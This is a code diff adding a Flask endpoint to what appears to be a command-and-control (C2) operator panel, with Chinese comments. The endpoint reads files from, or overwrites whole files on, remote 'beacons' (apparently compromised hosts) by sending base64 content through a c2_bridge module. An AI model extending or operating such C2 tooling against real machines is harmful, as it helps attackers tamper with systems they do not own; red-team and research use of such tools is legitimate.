@@ -391,6 +391,36 @@ def register(app):
         _c2_audit(app.config["get_redis"](), line, out)
         return jsonify({"ok": True, "output": out})
 
+    @app.route("/api/c2/file-edit", methods=["POST"])
+    @login_required
+    def c2_file_edit():
+        """文件编辑弹窗: 读(纯内容) / 写(内容推回, 自动 base64)。"""
+        config = load_yaml(app.config["CONFIG_PATH"])
+        c2cfg = _c2_config(config)
+        if not c2cfg["enabled"]:
+            return jsonify({"ok": False, "error": "C2 未启用"}), 400
+        c2_bridge.init_c2(c2cfg["project_root"], c2cfg["config_file"])
+        data = request.get_json(silent=True) or {}
+        action = str(data.get("action", ""))
+        bid = str(data.get("beacon_id", "") or "")
+        path = str(data.get("path", "") or "")
+        if action not in ("read", "write") or not bid or not path:
+            return jsonify({"ok": False,
+                            "error": "参数不完整(action/beacon_id/path)"}), 400
+        if action == "read":
+            ok, msg = c2_bridge.exec_module_to_beacon(
+                bid, "edit", [path, "", "0"])
+            rec = c2_bridge.get_beacon(bid)
+            before = len(getattr(rec, "results", None) or []) if rec else 0
+            return jsonify({"ok": ok, "message": msg,
+                            "before_count": before})
+        # write: 内容 base64 后走 edit 模块写模式(整文件替换)
+        import base64 as _b64
+        content = str(data.get("content", "") or "")
+        b64 = _b64.b64encode(content.encode("utf-8")).decode("ascii")
+        ok, msg = c2_bridge.exec_module_to_beacon(bid, "edit", [path, b64])
+        return jsonify({"ok": ok, "message": msg})
+
     @app.route("/api/c2/select", methods=["POST"])
     @login_required
     def c2_select():
